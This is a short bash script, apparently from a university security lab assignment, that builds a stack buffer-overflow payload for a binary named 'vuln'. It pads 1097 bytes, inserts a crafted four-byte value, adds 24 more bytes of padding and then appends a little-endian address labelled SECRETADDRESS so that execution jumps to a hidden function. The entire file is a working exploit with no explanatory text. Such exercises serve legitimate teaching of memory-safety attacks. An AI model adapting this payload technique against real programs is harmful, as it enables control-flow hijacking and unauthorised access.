#!/usr/bin/env bash

BUFFER=$(printf "a%.s" {1..1097})
THING="\xf0\xd0\xff\xff"
BUFFER2=$(printf "a%.s" {1..24})
SECRETADDRESS="\xc6\x91\x04\x08"

/task2/s2155323/vuln $(echo -en $BUFFER$THING$BUFFER2$SECRETADDRESS)
